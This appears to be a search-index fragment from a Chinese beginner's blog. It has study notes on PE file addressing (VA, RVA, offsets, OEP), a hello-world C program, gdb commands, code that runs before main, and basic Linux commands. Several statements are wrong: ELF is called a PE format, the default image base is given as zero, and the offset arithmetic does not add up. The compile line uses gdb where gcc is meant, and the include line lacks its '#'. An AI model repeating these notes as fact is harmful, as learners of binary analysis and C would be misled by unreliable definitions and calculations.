        <content type="html"><![CDATA[<p>1.a.c预处理为a.i编译为a.s汇编为a.o链接为a.exe。</p><p>2.进程是动态的，有生命周期，动态生成，动态消亡。程序是静态的，是指令与代码的集合。一个程序至少有一个进程，一个进程至少有一个线程，进程是资源分配的基本单位，线程是调度的基本单位。</p><p>3.windows中.exe .dll .sys均为pe格式，Linux中.elf为pe格式.</p><p>4.eop为程序的入口点，oep为原入口点。程序可能套壳，壳的入口点为eop。壳运行时还会到原入口点执行，称原入口点为oep。imagebase为内存基地址，默认为0x000000。VA为pe文件在内存的虚拟地址。RVA是相对于imagebase的虚拟地址。RVA&#x3D;VA-imagebase。VOFFSET是pe文件节的起始地址相对于imagebase的偏移(内存中相对于imagebase的偏移)。Roffset相对于文件在磁盘首地址的偏移。Voffset(内存)&#x3D;节的起始地址(虚拟地址)-imagebase地址。Roffset(磁盘)&#x3D;节的起始地址-文件的首地址(磁盘)</p><p>PE文件是一种Windows可执行文件格式，包含了程序代码、数据和资源等信息。在PE文件中，以下是一些相关概念：</p><ul><li>VA（Virtual Address）：虚拟地址，是程序在内存中的地址。VA是相对于进程的基地址（Image Base）的偏移量，进程的基地址由操作系统决定。在内存中，程序的代码和数据被映射到VA指向的地址空间中。</li><li>RVA（Relative Virtual Address）：相对虚拟地址，是相对于模块基地址（Module Base）的偏移量，模块基地址是PE文件在内存中的起始地址。RVA通常用于描述PE文件中各种数据结构的地址，如PE头、节表、导入表、导出表等。</li><li>Voffset：虚拟偏移量，是一个虚拟地址相对于文件头的偏移量。例如，一个VA为0x4000的代码段在PE文件中的偏移量为Voffset &#x3D; 0x4000 - Image Base。</li><li>Roffset：相对偏移量，是一个RVA相对于文件头的偏移量。例如，一个RVA为0x1000的代码段在PE文件中的偏移量为Roffset &#x3D; 0x1000。</li></ul><p>总的来说，VA和RVA是描述程序在内存中的位置，而Voffset和Roffset是描述程序在PE文件中的位置。需要注意的是，对于不同的PE文件，Image Base和模块基地址可能不同，因此VA和RVA也会不同。</p><p>5.VA对应的文件偏移量（Offset）</p><p>Offset &#x3D; VA - ImageBase + ROffset </p><p>Offset &#x3D; 0x00049586 - 0x00040000 + 0x00000540 </p><p>Offset &#x3D; 0x00009526</p><p>.text段的起始地址 &#x3D; ImageBase + ROffset - VOffset</p><p>.text段的起始地址 &#x3D; 0x00040000 + 0x00000540 - 0x0000540 </p><p>.text段的起始地址 &#x3D; 0x00040000</p><p>因此，该VA对应的文件地址为：.text段的起始地址 + Offset，即：</p><p>FileAddress &#x3D; .text段的起始地址 + Offset </p><p>FileAddress &#x3D; 0x0000540 + 0x00009526 </p><p>FileAddress &#x3D; 0x0000E066</p>]]></content>
      
      
      
        <tags>
            
            <tag> c </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Helloworld</title>
      <link href="/posts/42962/"/>
      <url>/posts/42962/</url>
      
        <content type="html"><![CDATA[<h2 id="hello-world的代码及注释"><a href="#hello-world的代码及注释" class="headerlink" title="hello world的代码及注释"></a>hello world的代码及注释</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/* this is the first c program */ #注释</span><br><span class="line">include &lt;stdio.h&gt; #头文件</span><br><span class="line">int main(void) #main函数(返回值,函数名,参数)</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;hello world&quot;); #打印</span><br><span class="line">    return 0; #返回语句</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="编写-编译-运行-调试"><a href="#编写-编译-运行-调试" class="headerlink" title="编写,编译,运行,调试"></a>编写,编译,运行,调试</h2><ul><li>debug <ul><li>便于一步步调试</li></ul></li><li>release<ul><li>更精简</li></ul></li><li>x86<ul><li>32位</li><li>处理器,寄存器处理4个字节</li><li>内存寻址32位</li></ul></li><li>x64<ul><li>64位</li><li>处理器，寄存器处理8个字节</li><li>内存寻址64位</li></ul></li><li>.cpp与.c的区别<ul><li>cpp语法更为严格</li><li>cpp可以在后定义变量</li></ul></li></ul><h2 id="Linux编写-编译-运行-调试"><a href="#Linux编写-编译-运行-调试" class="headerlink" title="Linux编写,编译,运行,调试"></a>Linux编写,编译,运行,调试</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim hello.c</span><br><span class="line">gcc hello.c -o hello #编译</span><br><span class="line">gdb hello.c -o hello_g -g  #编译为debug版本</span><br><span class="line">gdb hello_g #打开</span><br></pre></td></tr></table></figure><h3 id="一些常用gdb命令"><a href="#一些常用gdb命令" class="headerlink" title="一些常用gdb命令"></a>一些常用gdb命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">b 行号：打断点</span><br><span class="line">info b：查看断点</span><br><span class="line">d 断点编号： 取消断点</span><br><span class="line">l 行号：显示代码</span><br><span class="line">l main：显示包含main的那一行</span><br><span class="line">r：run，开始运行程序,跳到第一个断点</span><br><span class="line">s：step，逐语句，对应vs的F11（进入函数）</span><br><span class="line">n：next，逐过程，对应vs的F10</span><br><span class="line">c：continue，跳转道下一个断点</span><br><span class="line">p：查看变量</span><br><span class="line">display / undisplay：常显示 或 取消常显示</span><br><span class="line">until 行号：跳转到指定行</span><br><span class="line">finish：执行完一个函数后停下</span><br><span class="line">bt：查看函数调用堆栈</span><br></pre></td></tr></table></figure><h2 id="在main之前执行函数"><a href="#在main之前执行函数" class="headerlink" title="在main之前执行函数"></a>在main之前执行函数</h2><h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"> __attribute((constructor)) void before_main()</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;before main!\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">__attribute((destructor)) void after_main()</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;after main!\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">   printf(&quot;This is main function.\n&quot;);</span><br><span class="line">   return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="win"><a href="#win" class="headerlink" title="win"></a>win</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int before_main(void)</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;before main!\n&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int after_main(void)</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;after main!\n&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">typedef int func();</span><br><span class="line"></span><br><span class="line">#pragma data_seg(&quot;.CRT$XIU&quot;)</span><br><span class="line">static func* before[] = &#123; before_main &#125;;</span><br><span class="line">#pragma data_seg(&quot;.CRT$XPU&quot;)</span><br><span class="line">static func* after[] = &#123; after_main &#125;;</span><br><span class="line">#pragma data_seg()</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;This is main function.&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> c </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux常用指令</title>
      <link href="/posts/21894/"/>
      <url>/posts/21894/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux常用指令"><a href="#Linux常用指令" class="headerlink" title="Linux常用指令"></a>Linux常用指令</h1><h2 id="cd-目录切换"><a href="#cd-目录切换" class="headerlink" title="cd 目录切换"></a>cd 目录切换</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd / #根目录</span><br><span class="line">cd /home #home目录</span><br></pre></td></tr></table></figure><h2 id="mkdir-创建空目录"><a href="#mkdir-创建空目录" class="headerlink" title="mkdir 创建空目录"></a>mkdir 创建空目录</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir test1 #创建test1目录</span><br></pre></td></tr></table></figure><h2 id="rmdir-删除空目录"><a href="#rmdir-删除空目录" class="headerlink" title="rmdir 删除空目录"></a>rmdir 删除空目录</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rmdir test1 #删除test1目录</span><br></pre></td></tr></table></figure><h2 id="cp-复制"><a href="#cp-复制" class="headerlink" title="cp 复制"></a>cp 复制</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp 1.txt /test1 #将1.txt复制到test1目录</span><br></pre></td></tr></table></figure><h2 id="mv-移动-amp-重命名"><a href="#mv-移动-amp-重命名" class="headerlink" title="mv 移动&amp;重命名"></a>mv 移动&amp;重命名</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mv 1.txt /test1 #将1.txt移动到test1目录</span><br><span class="line">mv test1 test2 #将test1重命名test2</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>about</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[<p>菜菜菜菜菜菜菜菜菜菜菜菜菜菜菜菜鸡Pwn手</p>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>categories</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>tags</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>link</title>
      <link href="/link/index.html"/>
      <url>/link/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
